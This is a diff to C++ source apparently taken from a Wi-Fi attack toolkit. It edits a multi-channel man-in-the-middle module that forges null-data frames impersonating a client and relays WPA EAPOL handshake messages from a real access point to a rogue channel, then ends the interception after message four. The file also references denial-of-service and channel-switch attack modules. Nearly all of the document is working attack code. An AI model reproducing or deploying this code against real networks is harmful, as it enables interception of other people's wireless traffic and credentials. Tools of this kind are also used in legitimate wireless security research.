@@ -1,13 +1,10 @@
 #include "attacks/mc_mitm/mc_mitm.h"
 
 #include <chrono>
-#include <cstring>
 #include <utility>
 #include <tins/tins.h>
 
 #include "attacks/by_target/scan_AP.h"
-#include "attacks/DoS_hard/dos_helpers.h"
-#include "attacks/DoS_soft/channel_switch/channel_switch.h"
 #include "attacks/mc_mitm/wifi_util.h"
 #include "logger/error_log.h"
 #include "logger/log.h"
@@ -123,7 +120,7 @@ void McMitm::handle_rx_real_chan(const unique_ptr<PDU> &pdu){
                 log(LogLevel::WARNING, "Client {} is going to sleep on real channel.", addr2.to_string());
                 Dot11Data null_frame{};
                 null_frame.type(Dot11::DATA);
-                null_frame.subtype(4);
+                null_frame.subtype(Dot11::DATA_NULL);
                 null_frame.addr1(ap_mac);
                 null_frame.addr2(addr2);
                 null_frame.addr3(ap_mac);
@@ -134,12 +131,14 @@ void McMitm::handle_rx_real_chan(const unique_ptr<PDU> &pdu){
         handle_from_ap_real(pdu, *dot11, addr1);
 
         // EAPOL od AP → forward na rogue channel
-        if(is_eapol(*pdu) /*&& clients.contains(addr1.to_string())*/){
-            log(LogLevel::INFO, "Real channel: EAPOL from AP -> forwarding to rogue channel");
+        if(is_eapol(*pdu) && clients.contains(addr1.to_string())){
+            int eapol_msg = get_eapol_msg_num(*pdu);
+            log(LogLevel::INFO, "Real channel: EAPOL {} from AP ->  rogue channel", eapol_msg);
             sock_rogue->send(*pdu, netconfig.rogue_channel);
+            if(eapol_msg == 4 && only_to_mitm) stop_mitm = true;
         }
     } else if(dot11->addr1() == client_mac || addr2 == client_mac){
-        display_client_traffic(*dot11, "Real channel");
+        display_client_traffic(*dot11, "Real channel", "_");
     }
 }
 }
